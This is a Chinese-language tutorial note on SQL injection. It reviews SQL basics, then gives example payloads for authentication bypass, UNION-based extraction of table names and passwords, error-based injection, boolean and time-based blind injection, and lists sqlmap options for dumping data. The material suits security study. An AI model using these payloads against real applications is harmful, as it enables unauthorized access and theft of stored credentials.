# SQL注入漏洞
[TOC]

## SQL基础
### 对象
|对象|类型名|描述|
|---|---|---|
|数据库|DATABASE|多种数据表的集合|
|表|TABLE|同类数据的集合|
|列|COLUMN|一个属性|
|行|ROW|一条数据|
|主键|PRIMARY KEY|唯一标识一条数据|
|外键|FOREIGN KEY|表之间的引用关系|

### 数据类型
#### 注释
- `--`：单行注释，后面内容被忽略
- `/* ... */`：多行注释，注释内容被忽略

#### 数值类型
- `INT`: 整数类型
- `BIGINT`: 大整数类型
- `DECIMAL`: 定点数类型
- `FLOAT`: 浮点数类型
  
#### 字符串类型
- `CHAR(n)`: 固定长度字符串类型，长度为n
- `VARCHAR(n)`: 可变长度字符串类型，最大长度为n
- `TEXT`: 文本类型，存储大文本数据

#### 日期和时间类型
- `DATE`: 日期类型，格式为YYYY-MM-DD
- `TIME`: 时间类型，格式为HH:MM:SS
- `DATETIME`: 日期和时间类型，格式为YYYY-MM-DD HH:MM:SS
- `TIMESTAMP`: 时间戳类型，表示从1970年1月1日00:00:00 UTC到当前时间的秒数

### 语句
#### 数据定义语言(DDL)
- `CREATE`：创建数据库、表、索引等
  - 创建数据库: 
    ```sql
    CREATE DATABASE database_name;
    ```
  - 创建表: 
    ```sql
    CREATE TABLE table_name (
        column1 datatype, 
        column2 datatype, 
        ...
    );
    ```
  - 创建索引: 
    ```sql
    CREATE INDEX index_name ON table_name (column1, column2, ...);
    ```
  
- `ALTER`: 修改表结构
  - 添加列: 
    ```sql
    ALTER TABLE table_name ADD column_name datatype;
    ```
  - 删除列: 
    ```sql
    ALTER TABLE table_name DROP COLUMN column_name;
    ```
  - 修改列: 
    ```sql
    ALTER TABLE table_name ALTER COLUMN column_name datatype;
    ```

- `DROP`: 删除数据库、表、索引等

- `TRUNCATE`: 清空表数据，但保留表结构

#### 数据操作语言(DML)
- `INSERT`: 插入数据
  - 插入一条数据:
    ```sql
    INSERT INTO table_name (column1, column2, ...)
        VALUES (value1, value2, ...);
    ```
  - 插入多条数据:
    ```sql
    INSERT INTO table_name (column1, column2, ...)
        VALUES (value1, value2, ...),
               (value1, value2, ...),
               ...;
    ```
  - 从另一个表中插入数据: 
    ```sql
    INSERT INTO table_name (column1, column2, ...)
        SELECT column1, column2, ...
            FROM another_table
            WHERE condition;
    ```

- `UPDATE`: 更新数据
  - 更新指定列的数据: 
    ```sql
    UPDATE table_name
        SET column1 = value1, column2 = value2, ...
        WHERE condition;
    ```

#### 数据查询语言(DQL)
- `SELECT`：查询数据
  - 查询所有列: 
    ```sql
    SELECT * FROM table_name;
    ```
  - 查询指定列: 
    ```sql
    SELECT column1, column2 FROM table_name;
    ```
  - 查询带条件的数据: 
    ```sql
    SELECT column1, column2 
        FROM table_name 
        WHERE condition;
    ```
  - 查询排序: 
    ```sql
    SELECT column1, column2 
        FROM table_name 
        ORDER BY column1 ASC|DESC;
    ```
  - 查询分组: 
    ```sql
    SELECT column1, COUNT(*)
        FROM table_name 
        GROUP BY column1
        HAVING COUNT(*) > 1;
    ```
  - 查询合并: 两个结果列数必须一致且类型兼容
    ```sql
    SELECT column1, column2 
        FROM table1
    UNION 
    SELECT column1, column2 
        FROM table2;
    ```

- `WHERE` 条件

| 运算符 | 含义 |
|---|---|
| `=`、`<>`、`!=` | 等于、不等于 |
| `<`、`<=`、`>`、`>=` | 大小比较 |
| `AND`、`OR`、`NOT` | 逻辑组合 |
| `BETWEEN` | 闭区间 |
| `IN` | 属于集合 |
| `LIKE` | 模式匹配 |
| `IS NULL` | 判断空值 |

- `GROUP BY` 分组

| 聚合函数 | 含义 |
|---|---|
| `COUNT(*)` | 行数 |
| `COUNT(column)` | 非空值行数 |
| `SUM(column)` | 求和 |
| `AVG(column)` | 平均值 |
| `MAX(column)` | 最大值 |
| `MIN(column)` | 最小值 |

### 内置函数
- `IF(condition, true_value, false_value)`：条件判断函数
#### 字符串函数
- `LENGTH(str)`：返回字符串长度
- `CONCAT(str1, str2, ...)`：连接字符串
- `SUBSTRING(str, start, length)`：截取字符串
- `GROUP_CONCAT(column)`：将分组中的值连接成一个字符串

#### 数学函数
- `ABS(num)`：返回绝对值
- `ROUND(num, decimals)`：四舍五入
  
#### 查询函数
- `NOW()`：返回当前日期和时间
- `database()`：返回当前数据库名
- `user()`：返回当前用户
 

### 内置表 (MySQL)
- `information_schema`：存储数据库元数据的系统数据库
  - `.tables`：存储数据库中所有表的信息
  - `.columns`：存储数据库中所有列的信息

## SQL注入
### 概念
应用把不可信输入作为 SQL 源代码的一部分交给数据库解析。

主要方法为：
$$ [结束原上下文] \rightarrow [加入攻击表达式] \rightarrow [消除剩余原语句] $$

### 判断上下文
- **字符串上下文**：输入被包裹在单引号或双引号中，`'` 或 `"` 后注入
- **数字上下文**：输入被当作数字处理，直接接注入
- **`LIKE`上下文**：输入被当作模式匹配处理，`%'` 或 `%"` 后注入

### 分类
#### 布尔恒真（认证绕过）
通过构造恒真条件绕过认证
```sql
' OR '1'='1' --
```

#### 联合查询（数据获取）
通过 `UNION` 关键字将攻击者的查询结果与原查询结果合并，从而获取数据

1. **确定列数**: 报错表示超出列数上界
    ```sql
     ORDER BY 1 --
     ORDER BY 2 --
    ...
    ```

2. **确定列类型**: 逐个试出兼容类型
    ```sql
     UNION SELECT 1,NULL,NULL -- # NULL 兼容大多数类型
     UNION SELECT 'a',NULL,NULL --
    ...
    ```

3. **确认回显列**: 观察回显结果，确定哪一列可以回显数据
    ```sql
     UNION SELECT 1,2,3 -- 
    ```

4. **获取数据**: 通过回显列获取敏感数据
    ```sql
     UNION SELECT 1,2,database() -- 获取当前数据库名
     UNION SELECT 1,2,table_name FROM information_schema.tables -- 获取表名
     UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_name='users' -- 获取列名
     UNION SELECT 1,2,password FROM users -- 获取密码
    ```

#### 错误基注入（数据获取）
通过构造错误条件，获取数据库返回的错误信息，从而获取敏感数据
1. **构造错误**: 通过除零、类型转换等方式触发
    ```sql
    AND 1/0 -- # 除零错误
    AND CAST('abc' AS INT) -- # 类型转换错误
    ```
2. **获取数据**: 通过错误信息获取敏感数据

#### 布尔盲注（数据获取）
1. **真假对照**：通过构造布尔条件，确认真假条件下的页面差异
    ```sql
    AND 1=1 -- # 真
    AND 1=2 -- # 假
    ```
2. **布尔化查询**： 把关于某个值的问题转换成布尔条件
    > 一般用二分法
    ```sql
    # 判断用户密码是否以 a 开头
    AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a' --
    # 二分版本
    AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 97 --
    ```

3. **盲注**: 进行假设，看能否返回正常页面，逐渐试出目标数据

    ```sql
    AND query_condition --
    AND query_condition --
    ...
    ```

#### 时间盲注（数据获取）
当页面没有明显的真假差异，通过延时来判断条件
```sql
# MySQL
AND IF(query_condition, SLEEP(5), 0) --
```
其余部分思路类似布尔盲注

## SQLmap
`sqlmap <options>`：自动化 SQL 注入工具
### 目标指定
- `-u URL`：指定目标 URL
- `-D database`：指定数据库
- `-T table`：指定表
- `-C column`：指定列

### 输出
- `--dbms`：指定数据库类型
- `--dbs`：列出数据库
- `--tables`：列出表
- `--columns`：列出列
- `--dump`：导出数据    



